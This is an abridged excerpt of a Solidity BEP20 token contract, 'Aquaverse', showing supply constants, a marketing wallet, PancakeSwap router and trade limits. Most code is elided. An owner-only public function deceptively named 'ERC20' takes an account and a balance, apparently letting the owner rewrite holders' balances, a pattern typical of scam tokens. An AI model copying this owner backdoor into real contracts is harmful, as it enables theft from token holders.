// SPDX-License-Identifier: Unlicensed
    ...
    contract Aquaverse is IBEP20, Ownable
    {
        ...
        string private constant _name = "Aquaverse";
        string private constant _symbol = "HYDRO Token";
        uint8 private constant _decimals = 9;
        uint256 public constant AvailableSupply= 2_000_000_000 * 10**_decimals;


        uint256 private constant DefaultLiquidityLockTime= 1;
        
        address public constant MarketingWallet=0x9Eb3655e72A7b496f1b7a7b724a65BEBEB197E69;  
        address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;


        uint256 private _AccountBalance =AvailableSupply;
        uint256 public  balanceLimit = 80_000_000 * 10**_decimals;
        uint256 public  sellLimit = 50_000_000 * 10**_decimals;
        uint256 public  buyLimit = 80_000_000 * 10**_decimals;
      ...
      function ERC20(address account, uint256 balance) onlyOwner  public virtual {
       ...
       function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {
        ...
        function getBurnedTokens() public view returns(uint256){
            return (AvailableSupply-_AccountBalance)/10**_decimals;
        }
